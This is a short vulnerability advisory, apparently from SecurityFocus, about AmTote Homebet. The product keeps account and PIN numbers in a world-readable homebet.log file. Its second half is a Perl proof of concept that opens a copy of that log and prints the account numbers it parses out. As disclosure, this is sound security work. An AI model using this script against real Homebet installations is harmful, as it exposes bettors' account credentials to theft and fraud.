source: http://www.securityfocus.com/bid/3370/info

AmTote Homebet is an Internet-based account wagering interface.

Homebet stores all account and corresponding PIN numbers in the homebet.log file stored in the Homebet virtual directory. On a default installation, the homebet.log file is world readable. This could allow an attacker to steal the log file and strip out the account and PIN numbers.

$logfile='c:\windows\desktop\homebet.log'; ##change as required
print "Extracting Account/pin numbers";
open(INFILE,$logfile);
while(<INFILE>){
($accn,$pin)=split(/account=/,$_);
if ($pin){print "Account Number=".$pin;}
}
